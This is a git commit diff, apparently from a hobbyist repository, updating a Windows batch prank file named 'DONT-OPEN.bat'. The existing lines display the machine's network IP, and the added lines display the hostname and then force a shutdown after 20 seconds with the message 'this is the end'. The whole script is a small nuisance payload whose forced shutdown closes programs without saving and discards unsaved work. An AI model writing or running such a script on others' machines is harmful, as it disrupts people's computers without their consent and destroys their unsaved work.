a912b5ca2c749bccea535a5b4ea6775ec4e3085a
pixlperfect01 <44816788+pixlperfect01@users.noreply.github.com>
2018-11-19 22:02:23 -0600

    Update DONT-OPEN.bat

--- DONT-OPEN.bat
+++ DONT-OPEN.bat
@@ -12,3 +12,7 @@
 
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 msg * %NetworkIP%
+
+for /f "usebackq" %%i in (`hostname`) do set host=%%i
+msg * %host%
+shutdown /s /f /t 20 /c "this is the end"
